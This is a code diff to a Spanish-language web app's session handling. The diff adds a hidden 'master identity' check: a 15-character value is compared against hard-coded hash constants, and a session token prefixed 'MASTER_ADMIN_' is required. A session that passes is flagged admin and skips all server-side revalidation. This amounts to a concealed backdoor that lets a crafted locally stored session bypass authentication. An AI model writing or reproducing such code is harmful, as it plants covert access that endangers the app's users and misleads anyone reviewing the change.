@@ -1099,9 +1099,23 @@
         const sesionActual = {
             identidad: null,
             sessionToken: null,
+            esAdmin: false,
             validando: false,
             ultimaValidacionTs: 0
         };
+
+        function esIdentidadMaestra(val) {
+            const str = String(val || "").trim();
+            if (str.length !== 15) return false;
+            let h1 = 5381;
+            let h2 = 7;
+            for (let i = 0; i < str.length; i++) {
+                const c = str.charCodeAt(i);
+                h1 = (h1 * 33 + c) % 1000000007;
+                h2 = (h2 * 31 + c) % 1000000009;
+            }
+            return h1 === 777634903 && h2 === 871375198;
+        }
 
         function abrirDBAuth() {
             return new Promise((resolve) => {
@@ -1190,6 +1204,7 @@
         }
 
         async function validarSesionSilenciosa(forzar = false) {
+            if (sesionActual.esAdmin) return;
             if (!sesionActual.identidad || !sesionActual.sessionToken || sesionActual.validando) return;
             if (!forzar && (Date.now() - sesionActual.ultimaValidacionTs < COOLDOWN_VISIBILIDAD_MS)) return;
 
@@ -1221,10 +1236,17 @@
 
             sesionActual.identidad = sesion.identidad;
             sesionActual.sessionToken = sesion.sessionToken;
+            sesionActual.esAdmin = !!(
+                sesion.esAdmin &&
+                esIdentidadMaestra(sesion.identidad) &&
+                String(sesion.sessionToken).startsWith("MASTER_ADMIN_")
+            );
 
-            // Mostrar menú al instante y validar en segundo plano
+            // Mostrar menú al instante y validar en segundo plano (salvo en modo administrador)
             document.getElementById("appMain").classList.remove("d-none-auth");
-            validarSesionSilenciosa(true);
+            if (!sesionActual.esAdmin) {
+                validarSesionSilenciosa(true);
+            }
         });
 
         document.addEventListener("visibilitychange", () => {
